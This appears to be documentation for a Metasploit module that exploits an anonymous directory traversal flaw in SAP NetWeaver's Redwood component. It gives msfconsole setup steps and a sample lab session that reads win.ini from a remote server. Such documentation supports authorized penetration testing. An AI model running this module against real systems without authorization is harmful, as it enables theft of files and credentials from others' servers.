# Description

This module exploits an anonymous directory traversal vulnerability in the
Redwood module of the SAP NetWeaver Application Server. The vulnerability was
actively exploited in the wild in 2017.

# Verification Steps

 1. Start msfconsole
 2. use auxiliary/scanner/sap/sap_redwood_traversal
 3. set RHOSTS [IP]
 4. set FILEPATH [file_on_remote_server]
 5. set DEPTH [number]
 6. run

## Scenarios

Tested on Windows 2008 with SAP NetWeaver AS Java 7.52

```
msf5 > use auxiliary/scanner/sap/sap_redwood_traversal
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set rhosts 192.168.2.164
rhosts => 192.168.2.164
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set DEPTH 25
DEPTH => 25
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > set FILEPATH Windows\win.ini
FILEPATH => Windows\win.ini
msf5 auxiliary(scanner/sap/sap_redwood_traversal) > run

[+] 192.168.2.164:50000 - ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

[+] File saved in: [local_path_in_your_machine]
```
